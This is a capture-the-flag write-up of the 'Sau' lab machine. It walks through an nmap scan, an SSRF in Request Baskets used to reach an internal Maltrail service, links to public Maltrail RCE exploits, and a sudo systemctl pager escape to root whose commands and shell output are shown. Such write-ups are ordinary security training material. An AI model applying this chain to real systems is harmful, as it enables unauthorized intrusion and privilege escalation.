---
description: Easy machine.
---

# Sau

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

## port scan result

```bash
└─➜ nmap 10.10.11.224 -sCV -T5 | tee ports.scan                                                                                                                               [0]
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-30 17:56 IST
Nmap scan report for sau.htb (10.10.11.224)
Host is up (0.40s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open  unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 30 Dec 2023 12:27:17 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 30 Dec 2023 12:26:36 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 30 Dec 2023 12:26:38 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94%I=7%D=12/30%Time=65900C81%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;

<--SNIPPED-->

SF:ose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.89 seconds
```

* No need of directory bruteforcing for this machine.

## Homepage

* Upon visiting the homepage, we can see that the machine is using vulnerable version of `Request Basket`

![image](https://gist.github.com/assets/56447720/eb023cd7-4f7f-4d5e-b26d-f01b547514d6)

* Read more about this vuln:
* https://github.com/entr0pie/CVE-2023-27163

{% embed url="https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7" %}

## Web Exploit

> Request-baskets is a web application built to collect and register requests on a specific route, so called basket. When creating it, the user can specify another server to forward the request.

* So basically, after creating a basket you can enable forward\_url with malicious IP, so if someone visit your basket, request is forwarded to malicious IP.
* An attacker can put localhost IP and can get information that are not meant to be public.
* Since port 80 was open (filtered) we can ask for request basket to fetch data for us.

### 1. Create a new basket

![image](https://gist.github.com/assets/56447720/a794e96e-0233-4c11-b91d-870b7508517a)

* After creating, it will prompt you with token, Click on Open basket

### 2. Forward Request

* Click on settings

![image](https://gist.github.com/assets/56447720/f94c8f05-19aa-4dbe-be4e-41c09655e67d)

* Configure with following settings

![image](https://gist.github.com/assets/56447720/1c42906f-08f3-4902-a6b6-ccde4bc21dd5)

### 3. Info leak

* After visiting our basket `(sau.htb:55555/<basket_name>)` ![image](https://gist.github.com/assets/56447720/f979ab45-dac0-4475-acb3-c5d0b507c70f)
* We can see it's using Mailtrail
* Upon google search, we can see it's vulnerable to RCE.
* Read more about the vuln :&#x20;

{% embed url="https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5" %}

## User Shell

* [**https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53**](https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53)

![image](https://gist.github.com/assets/56447720/c81e29ab-ce81-4375-bd5f-d591203b7912)

## Root shell

```bash
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

```

* Resource:

{% embed url="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/" %}

```bash
$ sudo  /usr/bin/systemctl status trail.service
sudo  /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh
!sshh!sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
#
```

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes's still pwning
